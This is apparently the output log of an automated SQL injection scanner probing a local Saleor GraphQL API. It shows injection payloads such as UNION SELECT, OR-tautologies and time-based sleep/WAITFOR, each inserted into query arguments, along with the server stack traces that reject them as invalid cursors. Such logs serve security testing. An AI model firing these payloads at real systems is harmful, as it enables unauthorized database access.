[+] Introspecting http://localhost:8000/graphql/

[>] Testing warehouse (string args: ['externalReference'])

[>] Testing warehouses (string args: ['before', 'after'])

	Payload:  '
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Incorrect padding", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
	Query: query { menuItems(channel: "' AND 1=0 UNION SELECT NULL,NULL--", before: "' AND 1=0 UNION SELECT NULL,NULL--", after: "' AND 1=0 UNION SELECT NULL,NULL--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd0 in position 1: invalid continuation byte", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ') OR ('1'='1
	Query: query { menuItems(channel: "') OR ('1'='1", before: "') OR ('1'='1", after: "') OR ('1'='1") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 46, in from_global_cursor", "    return json.loads(values)", "           ^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/__init__.py\", line 346, in loads", "    return _default_decoder.decode(s)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 341, in decode", "    raise JSONDecodeError(\"Extra data\", s, end)", "json.decoder.JSONDecodeError: Extra data: line 1 column 2 (char 1)", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: admin' --
	Query: query { menuItems(channel: "admin' --", before: "admin' --", after: "admin' --") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Invalid base64-encoded string: number of data characters (5) cannot be 1 more than a multiple of 4", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR sleep(5)--
	Query: query { menuItems(channel: "' OR sleep(5)--", before: "' OR sleep(5)--", after: "' OR sleep(5)--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "UnicodeDecodeError: 'utf-8' codec can't decode byte 0xea in position 4: invalid continuation byte", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' AND sleep(5)--
	Query: query { menuItems(channel: "' AND sleep(5)--", before: "' AND sleep(5)--", after: "' AND sleep(5)--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Invalid base64-encoded string: number of data characters (9) cannot be 1 more than a multiple of 4", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' WAITFOR DELAY '0:0:5'--
	Query: query { menuItems(channel: "' WAITFOR DELAY '0:0:5'--", before: "' WAITFOR DELAY '0:0:5'--", after: "' WAITFOR DELAY '0:0:5'--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Incorrect padding", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 'x'='x' /*
	Query: query { menuItems(channel: "' OR 'x'='x' /*", before: "' OR 'x'='x' /*", after: "' OR 'x'='x' /*") { totalCount } }
